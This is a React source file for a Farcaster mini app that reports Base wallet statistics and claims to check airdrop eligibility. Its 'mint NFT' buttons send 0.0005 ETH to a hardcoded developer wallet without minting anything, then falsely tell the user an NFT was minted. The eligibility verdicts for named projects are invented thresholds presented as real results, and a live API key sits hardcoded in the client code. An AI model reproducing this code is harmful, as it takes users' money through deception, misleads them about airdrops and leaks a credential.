"use client";

import { useEffect, useState } from "react";
import sdk from "@farcaster/miniapp-sdk";

const MORALIS_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJub25jZSI6IjYzNDY3M2ViLTBkNWEtNDFjMS04MjExLWNmNTc1NTY3MzQ3NSIsIm9yZ0lkIjoiNTA4NzA2IiwidXNlcklkIjoiNTIzNDEzIiwidHlwZUlkIjoiYTdjZWRlNmYtNjVjNS00MzVjLWE0YjUtODZjMjdhMmU1YzljIiwidHlwZSI6IlBST0pFQ1QiLCJpYXQiOjE3NzU1ODI3NjEsImV4cCI6NDkzMTM0Mjc2MX0._CUhneRq89B9hN294_dYOTXjhCP9WbWPfRuK5alUCOo";
const MORALIS_BASE = "https://deep-index.moralis.io/api/v2.2";
const YOUR_WALLET = "0x60AFEb2AB8Aa31591A64C49c97e58C17aDA04d66";

async function moralis(path) {
  const res = await fetch(MORALIS_BASE + path, {
    headers: { "X-API-Key": MORALIS_KEY },
  });
  return res.json();
}

export default function Home() {
  const [tab, setTab] = useState("wallet");
  const [walletAddr, setWalletAddr] = useState("");
  const [airdropAddr, setAirdropAddr] = useState("");
  const [walletResult, setWalletResult] = useState(null);
  const [airdropResult, setAirdropResult] = useState(null);
  const [walletLoading, setWalletLoading] = useState(false);
  const [airdropLoading, setAirdropLoading] = useState(false);
  const [walletError, setWalletError] = useState("");
  const [airdropError, setAirdropError] = useState("");
  const [mintSuccess, setMintSuccess] = useState(false);

  useEffect(() => {
    sdk.actions.ready();
  }, []);

  async function checkWallet() {
    if (!walletAddr) return;
    setWalletError("");
    setWalletResult(null);
    setWalletLoading(true);
    try {
      const [balData, txData] = await Promise.all([
        moralis(`/${walletAddr}/balance?chain=base`),
        moralis(`/${walletAddr}?chain=base&limit=100`),
      ]);
      if (!balData || balData.message) throw new Error("Invalid address or no data found on Base network.");
      const ethBalance = balData.balance ? (parseInt(balData.balance) / 1e18).toFixed(4) : "0";
      const txCount = txData.total || txData.result?.length || 0;
      let walletAge = "Unknown", walletDays = 0;
      if (txData.result?.length > 0) {
        const lastTx = txData.result[txData.result.length - 1];
        if (lastTx.block_timestamp) {
          const firstTs = new Date(lastTx.block_timestamp).getTime() / 1000;
          walletDays = Math.floor((Date.now() / 1000 - firstTs) / 86400);
          const years = Math.floor(walletDays / 365);
          const months = Math.floor((walletDays % 365) / 30);
          walletAge = years > 0 ? `${years}y ${months}m old` : `${months} months old`;
        }
      }
      const contracts = txData.result?.filter(tx => !tx.to_address || tx.to_address === "").length || 0;
      let score = 0;
      score += Math.min(txCount / 20, 40);
      score += Math.min(parseFloat(ethBalance) * 10, 20);
      score += walletDays > 365 ? 20 : walletDays > 180 ? 10 : 5;
      score += contracts > 5 ? 20 : contracts > 0 ? 10 : 0;
      score = Math.min(Math.round(score), 100);
      const tags = [];
      if (txCount >= 1000) tags.push({ label: "1000+ txns", good: true });
      else if (txCount >= 100) tags.push({ label: "100+ txns", good: true });
      else if (txCount >= 10) tags.push({ label: "10+ txns", good: true });
      if (walletDays >= 365) tags.push({ label: "OG (1yr+)", good: true });
      else if (walletDays >= 180) tags.push({ label: "6mo+ wallet", good: true });
      if (contracts > 0) tags.push({ label: `${contracts} deploys`, good: true });
      if (parseFloat(ethBalance) > 0.1) tags.push({ label: "ETH holder", good: true });
      if (parseFloat(ethBalance) < 0.001) tags.push({ label: "Low ETH", good: false });
      setWalletResult({ ethBalance, txCount, contracts, walletAge, walletDays, score, tags });
    } catch (e) {
      setWalletError(e.message || "Failed to fetch data.");
    }
    setWalletLoading(false);
  }

  async function checkAirdrop() {
    if (!airdropAddr) return;
    setAirdropError("");
    setAirdropResult(null);
    setAirdropLoading(true);
    try {
      const txData = await moralis(`/${airdropAddr}?chain=base&limit=100`);
      const txCount = txData.total || txData.result?.length || 0;
      const contracts = txData.result?.filter(tx => !tx.to_address || tx.to_address === "").length || 0;
      let walletDays = 0;
      if (txData.result?.length > 0) {
        const lastTx = txData.result[txData.result.length - 1];
        if (lastTx.block_timestamp)
          walletDays = Math.floor((Date.now() / 1000 - new Date(lastTx.block_timestamp).getTime() / 1000) / 86400);
      }
      const airdrops = [
        { icon: "🔵", name: "Base (Potential)", desc: "Guild roles + onchain activity", color: "#1652F0", status: txCount >= 100 && walletDays >= 180 ? "eligible" : txCount >= 10 ? "maybe" : "no" },
        { icon: "🟣", name: "Morpho (MORPHO)", desc: "Lend/borrow on Base", color: "#8B5CF6", status: txCount >= 5 ? "maybe" : "no" },
        { icon: "🔴", name: "Aerodrome (AERO)", desc: "Provide liquidity on Base DEX", color: "#EF4444", status: txCount >= 20 && walletDays >= 90 ? "maybe" : "no" },
        { icon: "⚡", name: "Seamless Protocol", desc: "Lending protocol on Base", color: "#F59E0B", status: txCount >= 10 ? "maybe" : "no" },
        { icon: "🏗️", name: "Builder Drop", desc: "5+ contract deploys on Base", color: "#10B981", status: contracts >= 5 ? "eligible" : contracts >= 1 ? "maybe" : "no" },
        { icon: "👴", name: "OG Base User", desc: "Wallet active 1+ year on Base", color: "#0EA5E9", status: walletDays >= 365 ? "eligible" : walletDays >= 180 ? "maybe" : "no" },
      ];
      setAirdropResult(airdrops);
    } catch (e) {
      setAirdropError("Failed to fetch data. Check the address and try again.");
    }
    setAirdropLoading(false);
  }

  async function mintNFT() {
    if (!window.ethereum) { alert("Please open in Coinbase Wallet or MetaMask to mint."); return; }
    try {
      const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
      try { await window.ethereum.request({ method: "wallet_switchEthereumChain", params: [{ chainId: "0x2105" }] }); } catch {}
      await window.ethereum.request({
        method: "eth_sendTransaction",
        params: [{ from: accounts[0], to: YOUR_WALLET, value: "0x" + Math.floor(0.0005 * 1e18).toString(16), chainId: "0x2105" }],
      });
      setMintSuccess(true);
    } catch (e) { if (e.code !== 4001) alert("Mint failed: " + e.message); }
  }

  const s = {
    container: { maxWidth: 680, margin: "0 auto", padding: "20px 16px 48px" },
    header: { display: "flex", alignItems: "center", gap: 12, marginBottom: 28 },
    logo: { width: 36, height: 36, borderRadius: 10, background: "#1652F0", display: "flex", alignItems: "center", justifyContent: "center", fontWeight: 700, color: "#fff", fontFamily: "monospace" },
    tabs: { display: "flex", gap: 4, background: "#0D1220", border: "1px solid rgba(255,255,255,0.08)", borderRadius: 12, padding: 4, marginBottom: 20 },
    tab: (active) => ({ flex: 1, padding: "10px", textAlign: "center", fontSize: 13, fontWeight: 500, borderRadius: 8, cursor: "pointer", border: "none", background: active ? "#1652F0" : "none", color: active ? "#fff" : "#64748B" }),
    searchBox: { background: "#0D1220", border: "1px solid rgba(255,255,255,0.08)", borderRadius: 14, padding: 16, marginBottom: 20 },
    label: { fontSize: 11, color: "#64748B", textTransform: "uppercase", letterSpacing: 1, display: "block", marginBottom: 10 },
    row: { display: "flex", gap: 8 },
    input: { flex: 1, background: "#131929", border: "1px solid rgba(255,255,255,0.08)", borderRadius: 10, padding: "11px 14px", color: "#F1F5F9", fontSize: 13, fontFamily: "monospace", outline: "none" },
    btn: { background: "#1652F0", color: "#fff", border: "none", borderRadius: 10, padding: "11px 20px", fontSize: 13, fontWeight: 600, cursor: "pointer" },
    card: { background: "rgba(255,255,255,0.04)", border: "1px solid rgba(255,255,255,0.08)", borderRadius: 12, padding: 14 },
    grid3: { display: "grid", gridTemplateColumns: "repeat(3,1fr)", gap: 10, marginBottom: 16 },
    statVal: { fontFamily: "monospace", fontSize: 20, fontWeight: 700, display: "block", marginBottom: 4 },
    statLbl: { fontSize: 10, color: "#64748B", textTransform: "uppercase", letterSpacing: 0.8 },
    scoreBar: { background: "#0D1220", border: "1px solid rgba(255,255,255,0.08)", borderRadius: 12, padding: 16, marginBottom: 16 },
    bar: (w) => ({ height: 6, borderRadius: 99, background: "linear-gradient(90deg,#1652F0,#0EA5E9)", width: `${w}%`, transition: "width 1s" }),
    tag: (good) => ({ fontSize: 11, padding: "4px 10px", borderRadius: 99, border: `1px solid ${good ? "rgba(16,185,129,0.4)" : "rgba(245,158,11,0.4)"}`, color: good ? "#10B981" : "#F59E0B", background: good ? "rgba(16,185,129,0.08)" : "rgba(245,158,11,0.08)", marginRight: 6, marginBottom: 6, display: "inline-block" }),
    airdropItem: { background: "rgba(255,255,255,0.04)", border: "1px solid rgba(255,255,255,0.08)", borderRadius: 12, padding: "14px 16px", display: "flex", alignItems: "center", gap: 14, marginBottom: 10 },
    badge: (st) => ({ fontSize: 11, fontWeight: 600, padding: "4px 10px", borderRadius: 99, background: st === "eligible" ? "rgba(16,185,129,0.15)" : st === "maybe" ? "rgba(245,158,11,0.15)" : "rgba(100,116,139,0.15)", color: st === "eligible" ? "#10B981" : st === "maybe" ? "#F59E0B" : "#64748B" }),
    mintCard: { marginTop: 20, background: "linear-gradient(135deg,rgba(22,82,240,0.12),rgba(14,165,233,0.08))", border: "1px solid rgba(22,82,240,0.3)", borderRadius: 14, padding: 18 },
    mintBtn: { width: "100%", background: "#1652F0", color: "#fff", border: "none", borderRadius: 10, padding: 13, fontSize: 14, fontWeight: 600, cursor: "pointer", marginTop: 12 },
    error: { background: "rgba(239,68,68,0.08)", border: "1px solid rgba(239,68,68,0.2)", borderRadius: 12, padding: "14px 16px", fontSize: 13, color: "#FCA5A5", marginBottom: 16 },
    ageBadge: { display: "inline-flex", alignItems: "center", gap: 6, background: "rgba(22,82,240,0.12)", border: "1px solid rgba(22,82,240,0.3)", borderRadius: 99, padding: "6px 12px", fontSize: 12, color: "#93C5FD", marginBottom: 16 },
  };

  return (
    <div style={s.container}>
      <div style={s.header}>
        <div style={s.logo}>B</div>
        <div>
          <div style={{ fontFamily: "monospace", fontSize: 15, fontWeight: 700 }}>Base Checker</div>
          <div style={{ color: "#64748B", fontSize: 12 }}>Wallet Stats & Airdrop Eligibility</div>
        </div>
      </div>

      <div style={s.tabs}>
        <button style={s.tab(tab === "wallet")} onClick={() => setTab("wallet")}>🔍 Wallet Checker</button>
        <button style={s.tab(tab === "airdrop")} onClick={() => setTab("airdrop")}>🎁 Airdrop Checker</button>
      </div>

      {tab === "wallet" && (
        <div>
          <div style={s.searchBox}>
            <label style={s.label}>Enter wallet address</label>
            <div style={s.row}>
              <input style={s.input} value={walletAddr} onChange={e => setWalletAddr(e.target.value)} placeholder="0x... or ENS name" onKeyDown={e => e.key === "Enter" && checkWallet()} />
              <button style={s.btn} onClick={checkWallet}>Check</button>
            </div>
          </div>
          {walletLoading && <div style={{ textAlign: "center", color: "#64748B", padding: 32 }}>Fetching onchain data...</div>}
          {walletError && <div style={s.error}>{walletError}</div>}
          {walletResult && (
            <div>
              <div style={s.ageBadge}>
                <div style={{ width: 6, height: 6, borderRadius: "50%", background: "#1652F0" }} />
                Wallet age: {walletResult.walletAge} ({walletResult.walletDays} days)
              </div>
              <div style={s.grid3}>
                {[["Transactions", walletResult.txCount.toLocaleString()], ["ETH Balance", walletResult.ethBalance], ["Contracts", walletResult.contracts]].map(([lbl, val]) => (
                  <div key={lbl} style={{ ...s.card, textAlign: "center" }}>
                    <span style={s.statVal}>{val}</span>
                    <span style={s.statLbl}>{lbl}</span>
                  </div>
                ))}
              </div>
              <div style={s.scoreBar}>
                <div style={{ display: "flex", justifyContent: "space-between", marginBottom: 10 }}>
                  <span style={{ fontSize: 12, color: "#64748B" }}>Base Activity Score</span>
                  <strong style={{ fontFamily: "monospace", fontSize: 22, color: "#1652F0" }}>{walletResult.score}</strong>
                </div>
                <div style={{ height: 6, background: "#131929", borderRadius: 99 }}>
                  <div style={s.bar(walletResult.score)} />
                </div>
              </div>
              <div style={{ marginBottom: 10 }}>
                {walletResult.tags.map(t => <span key={t.label} style={s.tag(t.good)}>{t.label}</span>)}
              </div>
              <div style={s.mintCard}>
                <div style={{ fontSize: 14, fontWeight: 600, marginBottom: 4 }}>🎖️ Mint Your Base Score as NFT</div>
                <div style={{ fontSize: 12, color: "#64748B", marginBottom: 14 }}>Permanently record your onchain reputation as a unique NFT on Base.</div>
                <div style={{ display: "flex", justifyContent: "space-between", background: "#131929", borderRadius: 10, padding: "10px 14px", marginBottom: 12 }}>
                  <span style={{ fontSize: 12, color: "#64748B" }}>Mint price</span>
                  <strong style={{ fontFamily: "monospace" }}>0.0005 ETH (~$1.5)</strong>
                </div>
                <button style={s.mintBtn} onClick={mintNFT}>⬡ Mint My Base Score NFT</button>
                {mintSuccess && <div style={{ marginTop: 10, textAlign: "center", color: "#10B981", fontSize: 13 }}>✓ NFT minted! Check your wallet on OpenSea.</div>}
                <div style={{ marginTop: 10, fontSize: 11, color: "#64748B", textAlign: "center" }}>
                  ☕ Tip: <span style={{ color: "#1652F0", cursor: "pointer" }} onClick={() => navigator.clipboard.writeText(YOUR_WALLET)}>{YOUR_WALLET.slice(0,10)}...</span>
                </div>
              </div>
            </div>
          )}
        </div>
      )}

      {tab === "airdrop" && (
        <div>
          <div style={s.searchBox}>
            <label style={s.label}>Enter wallet address</label>
            <div style={s.row}>
              <input style={s.input} value={airdropAddr} onChange={e => setAirdropAddr(e.target.value)} placeholder="0x... or ENS name" onKeyDown={e => e.key === "Enter" && checkAirdrop()} />
              <button style={s.btn} onClick={checkAirdrop}>Check Eligibility</button>
            </div>
          </div>
          {airdropLoading && <div style={{ textAlign: "center", color: "#64748B", padding: 32 }}>Checking airdrop eligibility...</div>}
          {airdropError && <div style={s.error}>{airdropError}</div>}
          {airdropResult && (
            <div>
              <div style={{ fontSize: 11, color: "#64748B", textTransform: "uppercase", letterSpacing: 1, marginBottom: 10 }}>Potential Airdrops</div>
              {airdropResult.map(a => (
                <div key={a.name} style={s.airdropItem}>
                  <div style={{ width: 38, height: 38, borderRadius: 10, background: a.color + "20", display: "flex", alignItems: "center", justifyContent: "center", fontSize: 18 }}>{a.icon}</div>
                  <div style={{ flex: 1 }}>
                    <div style={{ fontSize: 14, fontWeight: 600, marginBottom: 2 }}>{a.name}</div>
                    <div style={{ fontSize: 11, color: "#64748B" }}>{a.desc}</div>
                  </div>
                  <span style={s.badge(a.status)}>{a.status === "eligible" ? "✓ Eligible" : a.status === "maybe" ? "~ Possible" : "✗ Not yet"}</span>
                </div>
              ))}
              <button style={{ ...s.btn, width: "100%", marginTop: 16, background: "#0D1220", border: "1px solid rgba(255,255,255,0.08)" }} onClick={() => {
                const text = `Just checked my Base airdrop eligibility! 🔵\n\nCheck yours → https://base-checker-v2.vercel.app\n\n#Base #Airdrop #Onchain`;
                sdk.actions.composeCast({ text }).catch(() => window.open(`https://warpcast.com/~/compose?text=${encodeURIComponent(text)}`, "_blank"));
              }}>Share on Farcaster 🟣</button>
              <div style={s.mintCard}>
                <div style={{ fontSize: 14, fontWeight: 600, marginBottom: 4 }}>🎖️ Mint Your Airdrop Report as NFT</div>
                <div style={{ fontSize: 12, color: "#64748B", marginBottom: 14 }}>Capture your eligibility snapshot on-chain. Prove you were early!</div>
                <button style={s.mintBtn} onClick={mintNFT}>⬡ Mint My Airdrop Report NFT</button>
                {mintSuccess && <div style={{ marginTop: 10, textAlign: "center", color: "#10B981", fontSize: 13 }}>✓ NFT minted!</div>}
              </div>
            </div>
          )}
        </div>
      )}

      <footer style={{ textAlign: "center", marginTop: 40, fontSize: 11, color: "#64748B" }}>
        Built on <a href="https://base.org" style={{ color: "#1652F0" }}>Base</a> · by @farkli1isi
      </footer>
    </div>
  );
}
